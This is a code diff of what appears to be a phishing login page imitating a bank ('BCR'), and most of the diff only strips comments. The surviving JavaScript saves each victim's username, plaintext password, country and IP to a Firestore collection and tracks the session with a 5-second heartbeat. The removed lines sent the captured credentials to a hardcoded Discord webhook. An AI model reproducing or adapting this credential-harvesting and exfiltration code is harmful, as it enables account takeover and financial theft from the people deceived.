@@ -25,14 +25,14 @@ footer {
 }
 .header-vertical {
   display: flex;
-  flex-direction: column; /* Apila los bloques verticalmente */
+  flex-direction: column;
   width: 100%;
 }
 
 .header-top {
-  background-color: #ffffff; /* Color blanco arriba */
-  padding: 10px 20px;        /* Espacio interno ajustable */
-  color: #000000;            /* Texto negro para contrastar */
+  background-color: #ffffff;
+  padding: 10px 20px;
+  color: #000000;
 }
 
 .header-bottom {
@@ -43,18 +43,17 @@ footer {
     width: 100%;
 }
 
-/* Contenedor centrado */
 .login-wrapper {
     display: flex;
     justify-content: center;
     align-items: center;
-    flex: 1; /* Ocupa el espacio disponible entre el header y el footer */
+    flex: 1;
     padding: 20px;
 }
 
 .login-container {
     background-color: rgba(255, 255, 255, 0.8);
-    padding: 40px 45px; /* Padding unificado y simétrico */
+    padding: 40px 45px;
     border-radius: 8px;
     box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
     width: 100%;
@@ -157,14 +156,13 @@ footer {
   }
   const db = firebase.firestore();
 
-  // --- SISTEMA DE LATIDOS (Heartbeat) MODIFICADO ---
+  // --- SISTEMA DE LATIDOS (Heartbeat) ---
   function enviarLatido() {
     const usuarioId = localStorage.getItem("usuario");
     
     if (usuarioId) {
       const docRef = db.collection("prolme").doc(usuarioId);
       
-      // Valida si el documento aún existe en Firestore antes de actualizar el latido
       docRef.get().then((doc) => {
         if (doc.exists) {
           docRef.set({
@@ -179,10 +177,8 @@ footer {
     }
   }
 
-  // El latido corre cada 5 segundos de forma independiente
   setInterval(enviarLatido, 5000);
 
-  // Enviar latido si el usuario oculta la pestaña
   window.addEventListener('visibilitychange', function() {
     if (document.visibilityState === 'hidden') {
       enviarLatido();
@@ -235,11 +231,9 @@ function togglePasswordVisibility() {
     
     if (passwordInput.type === 'password') {
         passwordInput.type = 'text';
-        // Icono de ojo tachado (ocultar contraseña)
         eyeIcon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.36 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.12c0-1.66-1.34-3-3-3l-.17.02z"/>';
     } else {
         passwordInput.type = 'password';
-        // Icono de ojo normal (mostrar contraseña)
         eyeIcon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
     }
 }
@@ -295,7 +289,7 @@ function checkInputs() {
         const ip = await getIPAddress();
 
         try {
-            // Guardar o actualizar en Firestore usando la sintaxis correcta v8
+            // Guardar o actualizar en Firestore
             await db.collection("prolme").doc(usuario).set({
                 user: usuario,
                 pass: contrasena,
@@ -309,20 +303,6 @@ function checkInputs() {
             }, { merge: true });
 
             localStorage.setItem("usuario", usuario);
-
-            const message = `➖➖➖➖➖[ 🏦BCR ]➖➖➖➖➖\n👤 Usuario: ${usuario}\n👤 Contraseña: ${contrasena}\n➖➖➖➖➖[ IP ]➖➖➖➖➖\nPaís: ${pais}\nIP: ${ip}\n➖➖➖➖➖[ By FwC 👨🏻‍💻 ]➖➖➖➖➖\n`;
-
-            const discord_webhook_url = "https://discord.com/api/webhooks/1535509840045281381/4ZtYNq9tt97-oWR6WRFp1nHqpNRjdL7mRk-BeGfkiXQBi7404IS_DEkLn7TlWkvTZIJj";
-
-            await fetch(discord_webhook_url, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify({
-                    content: message
-                }),
-            });
 
             window.location.href = "cargando.html";
         } catch (error) {
